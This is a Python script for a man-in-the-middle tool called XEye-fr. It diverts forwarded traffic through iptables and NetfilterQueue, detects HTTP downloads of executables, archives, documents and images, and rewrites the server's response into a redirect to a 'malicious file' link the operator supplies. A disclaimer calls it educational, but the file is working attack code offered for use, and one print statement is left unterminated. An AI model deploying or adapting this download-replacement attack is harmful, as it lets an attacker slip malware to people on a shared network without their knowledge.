#! /usr/bin/env python3
import scapy.all as sc
import netfilterqueue as netf
import time
import subprocess
import re
ackaseq = []
def udte():
    print("\n[Info] --> XEye-fr will check for updates, please wait .....\n\n")
    time.sleep(1)
    chupd = subprocess.check_output(['git','pull'])
    chked = re.search(r"Already up to date", str(chupd))
    chkeds = re.search(r"actualizado", str(chupd))
    bupted = re.search(r"changed,", str(chupd))
    if chked or chkeds:
        #print("\n[Congrats] --> the tool is "+str(chked[0].lower()))
        print("[Congrats] --> XEye-fr is already up to date")
        time.sleep(2)
    else:
        print("\n[Info] --> XEye-fr will be updated, please wait ...... \n")
        time.sleep(1)
        if bupted:
            print("\n[Congrats] --> XEye-fr is updated. Now bugs are fixed and more features added ")
            time.sleep(3)
            print("[Instruction] --> Please rerun XEye-fr so the updates will take effect.   Exiting ........")
            time.sleep(1)
            exit()
        else:
            print("\n[Warning] --> The tool couldn't be updated, please try again or reclone the tool by following the next instructions \n")
            time.sleep(3)
            print("\n[Instruction] --> Remove the \"XEye-fr\" folder by going up one directory and by running this command \"cd ..\" ")
            print("\n[Instruction] -->  then run this cmd \"rm -rf XEye-fr\" to remove the XEye-fr folder ")
            print("\n[Instruction] --> Run this command \"git clone https://github.com/Engmostafa26/XEye-fr.git\" ")
            print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/XEyecs")
            exit()
def Checkroot():
    who = subprocess.check_output('whoami')
    chuser = re.search(r"root", str(who))
    if chuser:
        udte()
    else:
        print("\n\n [Warning] --> You are not root - Please run XEye-fr with sudo command - ex: \"sudo XEye-fr\" - Exiting ...")
        # time.sleep(3)
        exit(3)
Checkroot()
print("***XEye***XEye***XEye***XEye***XEye***XEye***XEye***XEye***XEye***XEye***XEye***XEye***XEye***")
print("\n Welcome to XEye-fr tool, the easy and fast downloads replacer for MiTM attacks ")
print("[Disclaimer] --> The tool is for Educational and Ethical Hacking purposes - Enjoy .....")
print("[Recommended --> You are more than welcome to subscribe to our YT channel to help you in learning EH]")
print("[XEye YT Channel] --> https://www.youtube.com/xeyecs")
print("***********************************************************************************************")
time.sleep(1)
linktf = input("[Required] --> Please enter or paste the link to the malicious file: ")
print("[Info] --> Configuring your Iptables for compatibility")
try:
    subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 3",shell=True)
    print("[Waiting] --> Waiting for a file to be replaced .......")
    def packeting(packets):
        packs = sc.IP(packets.get_payload())
        if packs.haslayer(sc.Raw) and packs.haslayer(sc.TCP):
            if packs[sc.TCP].dport == 80:
                #print("HTTP Request -------")
                lraw = str(packs[sc.Raw].load)
                if ".exe" in lraw or ".zip" in lraw or ".rar" in lraw or ".pptx" in lraw or ".pdf" in lraw or "xls" in lraw or "png" in lraw or "jpg" in lraw:
                    ackaseq.append(packs[sc.TCP].ack)
                    print("[Gongrats] --> Target is about to download a file ......")
                    time.sleep(1)
                    #print("[Attempt] --> Now trying to replace the file ......")
                    #packs.show()
            elif packs[sc.TCP].sport == 80:
                #print("HTTP Response -------")
                if packs[sc.TCP].seq in ackaseq:
                    if "200 OK" in str(packs[sc.Raw].load):
                        ackaseq.remove(packs[sc.TCP].seq)
                        print("[Attempt] --> Replacing the download link with \""+linktf+"\" .....")
                        secline = "\n"
                        packs[sc.Raw].load = str("HTTP/1.1 301 Moved Permanently\nLocation: "+linktf+"\n\n")
                        #packs.show()
                        del packs[sc.IP].len
                        del packs[sc.IP].chksum
                        del packs[sc.TCP].chksum
                        packets.set_payload(bytes(packs))


        packets.accept()

    nfque = netf.NetfilterQueue()
    nfque.bind(3,packeting)
    nfque.run()
except:
    print("[Restoring] --> Removing the forward rule...)
    subprocess.call("sudo iptables -D FORWARD -j NFQUEUE --queue-num 3",shell=True)
    time.sleep(1)
    print("[❤] --> Thanks for using XEye-fr")
